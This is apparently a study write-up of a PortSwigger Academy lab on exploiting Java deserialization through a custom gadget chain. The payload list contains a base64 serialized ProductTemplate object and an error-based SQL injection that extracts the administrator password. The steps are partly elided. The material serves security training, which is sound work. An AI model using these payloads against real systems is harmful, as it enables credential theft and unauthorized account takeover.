# Lab: Developing a custom gadget chain for Java deserialization

**Official lab:** [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

## Lab idea

This challenge focuses on analyzing available Java application code to understand how deserialized objects flow through application behavior. It practices identifying a custom gadget chain and how that chain can expose sensitive data and affect authorization.

## Vulnerability in brief
Serialization converts an object and its state into a format that can be stored or transmitted; deserialization rebuilds that data as a usable object. Insecure deserialization occurs when an application deserializes data that an attacker can control. Because object fields and, in some implementations, object types are restored, crafted data may influence application logic before or during normal use of the object. This is a vulnerability class, not a general learning or testing category.

## Solution idea
1. Log in to your own account and notice the session cookie contains a serialized Java object.
2. From the site map, notice that the website references the file /backup/AccessTokenUser.java .
3. Navigate upward to the /backup directory and notice that it also contains a ProductTemplate.java file.
4. Notice that the ProductTemplate.readObject() method passes the template's id attribute into a SQL statement.
- …
6. List the contents of the database and identify that there is a table called users with a column called password .
7. Use a suitable SQL injection payload to extract the password from the users table.
8. To solve the lab, log in as administrator using the extracted password, open the admin panel, and delete carlos .

## Payloads / key values
- `/backup/AccessTokenUser.java`
- `/backup`
- `ProductTemplate.java`
- `ProductTemplate.readObject()`
- `id`
- `ProductTemplate`
- `"your-payload-here"`
- `Main.java`
- `PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4vPjxAL2Zyb21fY2hhcmNvZGVfMz5ZT1VSLVBBWUxPQUQtSEVSRTxAc2V0X2xlbj48QGxlbmd0aF8wPllPVVItUEFZTE9BRC1IRVJFPEAvbGVuZ3RoXzA+PEAvc2V0X2xlbj48QC9iYXNlNjRfND4=`
- `<@base64>¬ísr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt<@from_charcode><@get_len/></@from_charcode>YOUR-PAYLOAD-HERE<@set_len><@length>YOUR-PAYLOAD-HERE</@length></@set_len></@base64>`
- `YOUR-PAYLOAD-HERE`
- `UNION`
- `users`
- `password`
- `' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--`
- `administrator`
- `carlos`

## Official source
- [PortSwigger Academy: Lab: Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)
